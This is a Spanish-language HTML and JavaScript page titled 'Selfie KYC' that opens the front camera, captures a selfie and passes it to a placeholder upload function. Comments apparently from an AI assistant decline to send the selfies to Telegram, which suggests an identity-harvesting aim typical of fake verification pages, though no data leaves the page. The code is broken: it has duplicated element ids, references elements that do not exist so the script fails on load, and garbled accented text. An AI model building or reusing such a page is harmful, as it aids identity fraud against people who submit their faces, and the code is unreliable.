<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Selfie KYC</title>
<style>
  html, body {
    margin: 0;
    padding: 0;
    height: 100%;
    overflow: hidden;
    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: #f5f7fb;
    color: #1c1c1e;
  }

  body {
    display: flex;
    justify-content: center;
    align-items: center;
  }

  .container {
    max-width: 460px;
    width: 100%;
    height: 100%;
    max-height: 760px;
    padding: 32px 22px 28px;
    background: #ffffff;
    border-radius: 24px;
    box-shadow:
      0 18px 45px rgba(0,0,0,0.18),
      0 8px 18px rgba(0,0,0,0.12);
    box-sizing: border-box;
    position: relative;
    display: flex;
    flex-direction: column;
  }

  /* ========== PANTALLA 1 (placeholder) ========== */
  #pantalla1 {
    display: flex;
    flex-direction: column;
    flex: 1;
  }

  .p1-header {
    margin-bottom: 32px;
  }

  .p1-title {
    font-size: 24px;
    font-weight: 700;
    color: #202840;
    margin: 0 0 8px 0;
  }

  .p1-subtitle {
    font-size: 15px;
    color: #6b7280;
    margin: 0;
    line-height: 1.4;
  }

  .p1-content {
    flex: 1;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    text-align: center;
  }

  .p1-placeholder-box {
    width: 220px;
    height: 140px;
    border-radius: 18px;
    border: 1px dashed #cbd5e1;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #9ca3af;
    font-size: 14px;
    margin-bottom: 28px;
  }

  #btnSacarSelfie {
    width: 100%;
    max-width: 260px;
    background-color: #05be50;
    border: none;
    border-radius: 999px;
    color: white;
    font-size: 16px;
    font-weight: 600;
    padding: 14px 0;
    cursor: pointer;
    user-select: none;
    transition: background-color 0.25s ease, transform 0.08s ease, box-shadow 0.15s ease;
    box-shadow: 0 10px 20px rgba(5,190,80,0.25);
  }

  #btnSacarSelfie:hover {
    background-color: #04a646;
  }

  #btnSacarSelfie:active {
    transform: translateY(1px);
    box-shadow: 0 5px 12px rgba(5,190,80,0.35);
  }

  /* ========== PANTALLA 2 (selfie) ========== */
  #pantalla2 {
    display: none;
    flex: 1;
    position: relative;
  }

  .close-btn {
    position: absolute;
    top: 10px;
    right: 6px;
    font-size: 24px;
    font-weight: 600;
    color: #1f2933;
    cursor: pointer;
    user-select: none;
    z-index: 10;
  }

  .p2-inner {
    height: 100%;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    text-align: center;
    padding-top: 10px;
  }

  .p2-title {
    font-size: 20px;
    font-weight: 700;
    color: #202840;
    margin: 0 0 6px 0;
  }

  .p2-subtitle {
    font-size: 14px;
    color: #6b7280;
    margin: 0 0 24px 0;
  }

  video,
  #fotoCapturada {
    width: 190px;
    height: 190px;
    border-radius: 50%;
    border: 8px solid #202840;
    background: #000;
    object-fit: cover;
    margin-bottom: 16px;
    transform: scaleX(-1); /* efecto espejo en video */
  }

  #fotoCapturada {
    display: none;
    transform: none; /* la foto ya no se espejea */
  }

  #instruccion {
    font-size: 15px;
    font-weight: 500;
    color: #202840;
    margin: 0 0 12px 0;
  }

  .hint {
    font-size: 13px;
    color: #6b7280;
    margin-bottom: 20px;
  }

  #btnTomarFoto {
    width: 190px;
    background-color: #05be50;
    border-radius: 999px;
    border: none;
    color: white;
    font-weight: 600;
    font-size: 16px;
    padding: 12px 0;
    cursor: pointer;
    user-select: none;
    transition: background-color 0.25s ease, transform 0.08s ease, box-shadow 0.15s ease, color 0.15s ease;
    position: relative;
    overflow: hidden;
    box-shadow: 0 10px 20px rgba(5,190,80,0.25);
  }

  #btnTomarFoto:hover {
    background-color: #04a646;
  }

  #btnTomarFoto:active {
    transform: translateY(1px);
    box-shadow: 0 5px 12px rgba(5,190,80,0.35);
  }

  #btnTomarFoto.loading {
    background-color: #04a646;
    color: #e5e7eb;
    cursor: not-allowed;
  }

  #btnTomarFoto.loading::after {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
    animation: loading 1.4s infinite;
  }

  @keyframes loading {
    0% { left: -100%; }
    100% { left: 100%; }
  }

  .success-msg {
    font-size: 13px;
    color: #10b981;
    margin-top: 10px;
    display: none;
  }

  @media (max-width: 600px) {
    .container {
      max-height: none;
      height: 100%;
      border-radius: 0;
      box-shadow: none;
    }
  }
</style>
</head>
<body>

<div class="container">
  <!-- ========== PANTALLA 1 (placeholder que t√∫ luego redise√±as) ========== -->
    <div id="pantalla2" aria-live="polite" aria-label="Instrucciones para selfie">
      <div class="close-btn" tabindex="0" role="button" aria-label="Cerrar">&#10005;</div>
      <div class="content">
        <video autoplay playsinline muted></video>
        <p id="instruccion">Mir&aacute; de frente a la c&aacute;mara con buena iluminaci&oacute;n</p>
        <button id="btnTomarFoto" type="button" aria-label="Tomar foto">Tomar foto</button>
        <img id="fotoCapturada" alt="Foto capturada" />
      </div>
    </div>

  <!-- ========== PANTALLA 2 (selfie √∫nica) ========== -->
  <div id="pantalla2" aria-live="polite" aria-label="Instrucciones para selfie">
    <div class="close-btn" tabindex="0" role="button" aria-label="Cerrar">&#10005;</div>
    <div class="p2-inner">
      <h2 class="p2-title">Selfie de verificaci√≥n</h2>
      <p class="p2-subtitle">Asegurate de estar en un lugar bien iluminado.</p>

      <video autoplay playsinline muted></video>
      <img id="fotoCapturada" alt="Foto capturada" />

      <p id="instruccion">Mir√° de frente a la c√°mara y encuadr√° tu rostro.</p>
      <p class="hint">Cuando est√©s listo, toc√° el bot√≥n para tomar la foto.</p>

      <button id="btnTomarFoto" type="button" aria-label="Tomar foto">
        Tomar foto
      </button>

      <div id="successMsg" class="success-msg">
        Selfie capturada correctamente.
      </div>
    </div>
  </div>
</div>

<script>
  const pantalla1 = document.getElementById('pantalla1');
  const pantalla2 = document.getElementById('pantalla2');
  const btnSacarSelfie = document.getElementById('btnSacarSelfie');
  const closeBtn2 = pantalla2.querySelector('.close-btn');

  const video = pantalla2.querySelector('video');
  const btnTomarFoto = document.getElementById('btnTomarFoto');
  const fotoCapturada = document.getElementById('fotoCapturada');
  const successMsg = document.getElementById('successMsg');
  const instruccion = document.getElementById('instruccion');

  let stream = null;

  // Iniciar c√°mara
  async function iniciarCamara() {
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });
      video.srcObject = stream;
    } catch (error) {
      alert("No se pudo acceder a la c√°mara. Revis√° los permisos del navegador.");
      pantalla2.style.display = 'none';
      pantalla1.style.display = 'flex';
    }
  }

  // Detener c√°mara
  function detenerCamara() {
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      stream = null;
    }
  }

  // Ir de pantalla 1 ‚Üí pantalla 2
  btnSacarSelfie.addEventListener('click', async () => {
    pantalla1.style.display = 'none';
    pantalla2.style.display = 'block';
    video.style.display = 'block';
    fotoCapturada.style.display = 'none';
    successMsg.style.display = 'none';
    instruccion.textContent = 'Mir√° de frente a la c√°mara y encuadr√° tu rostro.';
    await iniciarCamara();
  });

  // Cerrar pantalla 2 y volver a pantalla 1
  closeBtn2.addEventListener('click', () => {
    pantalla2.style.display = 'none';
    pantalla1.style.display = 'flex';
    detenerCamara();
  });

  // Tomar UNA foto
  btnTomarFoto.addEventListener('click', async () => {
    if (!stream) return;

    btnTomarFoto.classList.add('loading');
    btnTomarFoto.textContent = 'Procesando...';
    btnTomarFoto.disabled = true;
    successMsg.style.display = 'none';

    // Crear canvas para capturar frame
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 190;
    canvas.height = video.videoHeight || 190;
    const ctx = canvas.getContext('2d');

    // Como el video est√° en espejo, opcionalmente puedes "desespejear" la imagen:
    // ctx.translate(canvas.width, 0);
    // ctx.scale(-1, 1);

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const blob = await new Promise(resolve => {
      canvas.toBlob(resolve, 'image/png');
    });

    // Mostrar preview en la UI
    const imgUrl = URL.createObjectURL(blob);
    fotoCapturada.src = imgUrl;
    fotoCapturada.style.display = 'block';
    video.style.display = 'none';
    instruccion.textContent = 'Revis√° que la selfie se vea claramente.';

    // üîí Aqu√≠ ir√≠a tu l√≥gica de env√≠o (a tu backend, servidor, etc.)
    // Por pol√≠ticas de seguridad no puedo implementarte directamente
    // el env√≠o de selfies/datos sensibles a Telegram u otros servicios.
    // Pero te dejo el hook listo:
    try {
      await enviarSelfieAlServidor(blob);
      successMsg.textContent = 'Selfie capturada y procesada correctamente.';
      successMsg.style.display = 'block';
    } catch (e) {
      console.error('Error al procesar la selfie en el servidor:', e);
      successMsg.textContent = 'Hubo un problema al procesar la selfie.';
      successMsg.style.display = 'block';
    }

    btnTomarFoto.classList.remove('loading');
    btnTomarFoto.textContent = 'Tomar otra foto';
    btnTomarFoto.disabled = false;
  });

  // Funci√≥n placeholder para que t√∫ conectes tu backend / Telegram / API
  async function enviarSelfieAlServidor(blob) {
    // Ejemplo de c√≥mo podr√≠as enviar a tu servidor (NO a Telegram directamente):
    //
    // const formData = new FormData();
    // formData.append('selfie', blob, 'selfie.png');
    //
    // const res = await fetch('/upload-selfie', {
    //   method: 'POST',
    //   body: formData
    // });
    //
    // if (!res.ok) {
    //   throw new Error('Error en el servidor');
    // }
    //
    // Ajusta la URL y l√≥gica seg√∫n tu backend.
    return Promise.resolve(); // placeholder para que no rompa
  }
</script>

</body>
</html>
